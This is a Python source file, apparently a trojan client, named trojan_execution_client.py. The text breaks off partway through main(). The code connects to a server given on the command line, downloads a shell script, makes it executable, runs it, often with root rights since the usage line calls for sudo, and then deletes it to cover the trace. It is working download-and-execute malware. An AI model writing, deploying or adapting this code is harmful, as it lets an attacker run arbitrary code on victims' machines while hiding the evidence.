# trojan_execution_client.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import sys
import subprocess
import tempfile
import os

def start_client(server_ip: str, server_port: int) -> None:
    """
    Connects to the server, downloads a shell script, executes it, 
    and then cleans up the temporary file.
    """
    try:
        # Create a standard TCP/IP socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            print(f"Attempting to connect to {server_ip} on port {server_port}...")
            sock.connect((server_ip, server_port))
            print("Connection established. Receiving script...")

            # Buffer to store the incoming script data
            response_data = b''
            while True:
                data_chunk = sock.recv(4096)
                if not data_chunk:
                    break
                response_data += data_chunk
                # If the chunk is smaller than the buffer, we've likely reached the end
                if len(data_chunk) < 4096:
                    break

            # Decode the received bytes into a string
            script_content = response_data.decode('utf-8')

            # Check if the server actually had a script to send
            if script_content.strip() == "SCRIPT_NOT_FOUND":
                print("The server did not provide any script.")
                return

            # Save the received script to a temporary file in the OS temp directory
            # 'delete=False' is used so we can execute it before manual removal
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix=".sh") as script_file:
                script_file.write(script_content)
                temp_script_path = script_file.name

            # Change file permissions to make the script executable (rwxr-xr-x)
            os.chmod(temp_script_path, 0o755)

            print(f"Executing received script ({temp_script_path})...\n")
            
            # Execute the script. check=False prevents the Python script from 
            # crashing if the shell script returns a non-zero exit code.
            subprocess.run([temp_script_path], check=False)

            # Cleanup: remove the temporary script file from the system
            os.remove(temp_script_path)
            print("Script executed and removed.")

    except ConnectionRefusedError:
        print(f"Error: Connection refused. Ensure the server is running on {server_ip}:{server_port}.")
    except socket.gaierror:
        print(f"Error: Invalid IP address: '{server_ip}'")
    except socket.error as e:
        print(f"Socket error: {e}")
    except KeyboardInterrupt:
        print("\nClient interrupted by user.")
    finally:
        print("Client terminated.")


def main():
    # Validate command line arguments
    if len(sys.argv) != 3:
        print(f"Usage: sudo python3 {sys.argv[0]} <server_ip> <server_port>")
        sys.exit(1)

    server_ip = sys.argv[1]
    try:
        server_port = int(sys.argv[2])
        # Validate
